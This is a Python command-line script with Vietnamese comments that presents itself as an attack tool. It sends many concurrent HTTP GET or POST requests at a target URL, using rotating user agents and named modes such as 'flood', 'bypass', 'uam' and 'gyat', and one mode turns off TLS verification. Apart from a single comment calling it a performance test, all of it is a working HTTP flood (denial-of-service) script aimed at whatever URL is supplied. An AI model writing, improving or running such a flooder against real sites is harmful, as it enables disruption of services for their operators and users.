import requests
import random
import argparse
import warnings
from concurrent.futures import ThreadPoolExecutor

# Màu cho output
RED = '\033[91m'
CYAN = '\033[96m'
RESET = '\033[0m'

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

METHODS = {
    "flood": "Flood",
    "bypass": "Bypass",
    "uam": "UAM",
    "tls": "TLS",
    "https": "HTTPS",
    "r2": "R2",
    "gyat": "Gyat",
}

# Gửi HTTP request
def send_request(target_url, method):
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        if method == "flood":
            response = requests.get(target_url, headers=headers, timeout=5)
        elif method == "bypass":
            response = requests.get(target_url + "/bypass", headers=headers, timeout=5)
        elif method == "uam":
            response = requests.get(target_url + "/uam", headers=headers, timeout=5)
        elif method == "tls":
            with warnings.catch_warnings():
                warnings.simplefilter("ignore")
                response = requests.get(target_url, headers=headers, timeout=5, verify=False)
        elif method == "https":
            response = requests.post(target_url, headers=headers, data={"flood": "test"}, timeout=5)
        elif method == "r2":
            response = requests.get(target_url + "/r2", headers=headers, timeout=5)
        elif method == "gyat":
            response = requests.post(target_url, headers=headers, data={"gyat": "attack"}, timeout=5)
        else:
            print(f"{RED}[ERROR]{RESET} Unknown method: {method}")
            return

        print(f"{CYAN}[{METHODS[method]}]{RESET} Sent to {target_url} -> {RED}Status: {response.status_code}{RESET}")
    except Exception as e:
        print(f"{RED}[ERROR]{RESET} {METHODS.get(method, method).upper()} failed: {e}")

# Chạy tấn công (test performance)
def run_attack(target_url, method, num_requests, max_workers=100):
    print(f"{RED}⚠️ Running {METHODS[method]} attack on {target_url} ⚠️{RESET}")
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        for _ in range(num_requests):
            executor.submit(send_request, target_url, method)
    print(f"{CYAN}✅ Attack completed! ✅{RESET}")

# Hiển thị menu trợ giúp dạng command line
def print_methods_help():
    print(f"{RED}🔥 Attack by nhân (CLI version) 🔥{RESET}")
    for k, v in METHODS.items():
        print(f"{CYAN}{k}{RESET} : {v}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Attack script không cần nhập input()")
    parser.add_argument("--method", required=True, choices=METHODS.keys(), help="Chọn phương thức (flood, bypass, uam, tls, https, r2, gyat)")
    parser.add_argument("--target_url", required=True, help="URL mục tiêu")
    parser.add_argument("--num_requests", type=int, default=100, help="Số lượng requests (mặc định 100)")
    parser.add_argument("--max_workers", type=int, default=100, help="Số threads tối đa (mặc định 100)")
    parser.add_argument("--show_methods", action="store_true", help="Hiển thị hướng dẫn các method")

    args = parser.parse_args()

    if args.show_methods:
        print_methods_help()
    else:
        run_attack(args.target_url, args.method, args.num_requests, args.max_workers)